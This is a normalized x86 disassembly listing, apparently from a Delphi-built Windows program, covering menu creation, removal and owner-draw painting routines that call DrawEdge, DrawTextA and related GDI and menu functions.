mov dl [ ebx + 0x3a ]
or eax [ edx * 4 + rw-data ]
mov [ ebp - 0x2d ] eax
movzx eax [ ebx + 0x50 ]
mov [ ebp - 0x29 ] eax
xor eax eax
mov [ ebp - 0x25 ] eax
xor eax eax
mov [ ebp - 0x21 ] eax
xor eax eax
mov [ ebp - 0x1d ] eax
mov eax [ ebp - 0x8 ]
call sub_404468
mov [ ebp - 0x15 ] eax
mov eax ebx
call sub_44ef40
test eax eax
jle r-xdata
lea eax [ ebp - 0x39 ]
push eax
push 0xffffffff
push 0xffffffff
push edi
call InsertMenuItemA
jmp r-xdata
mov eax ebx
call sub_44d4d4
mov [ ebp - 0x25 ] eax
sub_44d23f
inc [ ecx ]
add [ eax ] al
add [ 0x55000000 ] ch
mov ebp esp
mov edx [ ebp + 0x8 ]
mov cl [ edx - 0x5 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x34 ]
call sub_44cfc4
xor eax eax
pop ebp
retn
sub_44d264
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x70 ]
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x70 ]
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_450b38
test al al
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_44fb00
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_44fffc
mov [ ebp - 0x5 ] al
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax r-xdata
mov ecx [ ebp - 0x4 ]
call sub_44ca00
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov al 0x1
sub_44d2d4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_44d31e
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_418b5c
mov eax [ ebp - 0x4 ]
call sub_44c888
mov edx eax
mov eax ebx
call sub_44ef74
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44d325
lea eax [ ebp - 0x4 ]
call sub_403fa8
retn
sub_44d32c
push ebx
mov ebx eax
test edx edx
je r-xdata
mov eax [ ebx + 0x68 ]
cmp edx eax
je r-xdata
test [ edx + 0x1c ] 0x8
jne r-xdata
pop ebx
retn
test eax eax
je r-xdata
mov eax edx
mov [ ebx + 0x68 ] eax
test eax eax
je r-xdata
xor ecx ecx
mov [ eax + 0x6c ] ecx
mov eax ebx
call sub_44d3a4
mov [ eax + 0x6c ] ebx
mov edx ebx
call sub_419afc
sub_44d368
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_419e7c
mov eax ebx
call sub_44ef28
test eax eax
je r-xdata
cmp [ ebx + 0x74 ] 0x0
je r-xdata
mov eax ebx
call sub_44ef28
mov edx eax
mov cl 0x1
mov eax ebx
mov si 0xffef
call sub_403454
pop esi
pop ebx
retn
mov eax ebx
call sub_44d3a4
sub_44d3a4
push ebx
push esi
push edi
push ebp
mov ebp eax
test [ ebp + 0x1c ] 0x8
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebp + 0x1c ] 0x2
je r-xdata
mov eax [ ebp + 0x6c ]
test eax eax
je r-xdata
mov [ ebp + 0x74 ] 0x1
jmp r-xdata
mov eax ebp
call sub_44d4d4
push eax
call GetMenuItemCount
mov esi eax
test esi esi
sete bl
test esi esi
jle r-xdata
call sub_44d3a4
jmp r-xdata
test bl bl
je r-xdata
push 0x400
mov edi esi
dec edi
push edi
mov eax ebp
call sub_44d4d4
push eax
call GetMenuState
test al 0x4
jne r-xdata
cmp [ ebp + 0x64 ] 0x0
jne r-xdata
dec esi
test esi esi
jg r-xdata
push 0x400
push edi
mov eax ebp
call sub_44d4d4
push eax
call RemoveMenu
mov bl 0x1
mov eax ebp
call sub_44d264
mov eax [ ebp + 0x70 ]
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
mov eax ebp
call sub_44d4d4
push eax
call GetMenuItemCount
test eax eax
jne r-xdata
mov eax [ ebp + 0x34 ]
push eax
call DestroyMenu
xor eax eax
mov [ ebp + 0x34 ] eax
jmp r-xdata
xor edx edx
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_44d474
push ebx
push esi
push edi
push ebp
push ecx
mov ebx ecx
mov [ esp ] edx
mov edi eax
mov eax edi
call sub_44ef40
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov edx ebp
mov eax edi
call sub_44ef50
cmp bl [ eax + 0x3f ]
jbe r-xdata
mov edx ebp
mov eax edi
call sub_44ef50
cmp bl [ eax + 0x3f ]
jae r-xdata
inc ebp
dec esi
jne r-xdata
mov edx ebp
mov eax edi
call sub_44ef50
mov [ eax + 0x3f ] bl
mov eax [ rw-data ]
call sub_44c57c
jmp r-xdata
cmp ebp [ esp ]
jge r-xdata
sub_44d4d4
push ebx
mov ebx eax
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
mov eax [ ebx + 0x34 ]
pop ebx
retn
mov eax [ ebx + 0x4 ]
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
call CreateMenu
mov [ ebx + 0x34 ] eax
call CreatePopupMenu
mov [ ebx + 0x34 ] eax
jmp r-xdata
mov eax ebx
call sub_44d264
mov eax [ rw-data ]
call sub_44c57c
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
sub_44d520
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_419da4
push ebx
push sub_44d2d4
push 0x0
push 0x0
xor ecx ecx
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop esi
pop ebx
retn
sub_44d564
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_44d748
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_44f4fc
mov edi eax
test edi edi
je r-xdata
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
call sub_404040
test bh 0x4
je r-xdata
mov eax edi
call sub_450b38
test al al
je r-xdata
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_4043b4
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
test bl 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov dl 0x1
call sub_41d700
cmp [ esi + 0x3a ] 0x0
je r-xdata
test bh 0x4
jne r-xdata
lea eax [ ebp - 0xc ]
mov edx r-xdata
call sub_404270
mov eax [ ebp - 0xc ]
cmp [ eax ] 0x26
jne r-xdata
mov eax ebx
and eax 0x2
cmp eax 0x2
jne r-xdata
and ebx 0xffffffff
or ebx 0x2
jmp r-xdata
cmp [ esi + 0x39 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edi [ eax + 0xc ]
mov eax edi
call sub_41d0d8
mov edx eax
or dl [ r-xdata ]
mov eax edi
call sub_41d0e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44d74f
lea eax [ ebp - 0xc ]
call sub_403fa8
retn
mov eax [ ebp + 0x10 ]
mov esi eax
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add [ ebp - 0x18 ] 0x4
push 0x2
push 0x6
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_41dd2c
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x1 ] 0x0
jne r-xdata
or ebx 0x20000
and ebx 0xfffffffd
or ebx 0x0
push ebx
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp - 0xc ]
call sub_404268
push eax
mov eax [ ebp - 0xc ]
call sub_404468
push eax
mov eax [ ebp - 0x4 ]
call sub_41dd2c
push eax
call DrawTextA
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
push 0x1
push 0x1
mov eax [ ebp + 0x10 ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx 0xff000014
call sub_41ce18
push ebx
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp - 0xc ]
call sub_404268
push eax
mov eax [ ebp - 0xc ]
call sub_404468
push eax
mov eax [ ebp - 0x4 ]
call sub_41dd2c
push eax
call DrawTextA
push 0xffffffff
push 0xffffffff
mov eax [ ebp + 0x10 ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx 0xff000010
call sub_41ce18
mov eax 0xff00000d
call sub_41c958
mov esi eax
mov eax 0xff000010
call sub_41c958
cmp esi eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx 0xff000014
call sub_41ce18
jmp r-xdata
sub_44d7b4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_44e09c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d988
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001d
call sub_41d5e4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_41ce18
jmp r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x30 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov al [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x31 ] al
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x20 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_4043b4
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001e
call sub_41d5e4
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d988
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x10 ] edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x8 ] 0xfffffffc
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
add [ eax - 0x8 ] 0x2
mov eax [ ebp + 0x8 ]
add [ eax - 0x4 ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x41 ] al
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_44a350
cmp ebx eax
jl r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x4c ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov esi [ eax + 0x4c ]
test esi esi
je r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
push 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
movzx eax [ eax + 0x38 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41dd2c
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x10 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
inc [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41d5dc
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000d
call sub_41d5e4
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
sub edx eax
sar edx 0x1
jns r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_421eac
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4c ] eax
xor eax eax
push ebp
push sub_44dbfb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
push 0x7ff8
push 0x0
call LoadBitmapA
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_422ff4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff000012
call sub_41ce18
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov esi [ ecx - 0xc ]
sub edx esi
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_44a350
cmp ebx eax
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_41d5e4
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d988
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41d5dc
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov edx 0xff000014
mov eax 0xff00000f
call sub_424098
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41d5b8
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d988
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x20 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x20
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xd ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax - 0x20 ] 0x2
mov eax [ ebp + 0x8 ]
dec [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x31 ]
mov ax [ eax * 2 + rw-data ]
or ax 0x60
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x64 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x65 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d988
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41db0c
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x5c ]
lea edi [ edx - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0x10 ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0x10 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx esi
inc edx
push edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx - 0x10 ]
sub edx ebx
sub edx eax
sar edx 0x1
jns r-xdata
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov al [ eax + 0x39 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_44a868
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41d5e4
mov eax [ ebp + 0x8 ]
inc [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
or eax 0x400
or eax 0x100
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_44d564
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x50 ]
mov edx [ ebp + 0x8 ]
sub eax [ edx - 0x58 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x14 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x1c ]
sub eax edx
sar eax 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov dl [ r-xdata ]
call sub_41d0e4
mov eax [ ebp + 0x8 ]
or [ eax - 0x64 ] 0x100000
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
push 0xf
push 0x2
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41dd2c
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0xc ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx ebx
inc edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
pop ecx
call sub_41d8dc
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
call sub_41ce18
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_403258
retn
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
push eax
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
jne r-xdata
push 0xf
push 0x4
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41dd2c
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_44d564
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov bx [ eax + 0x60 ]
test bx bx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
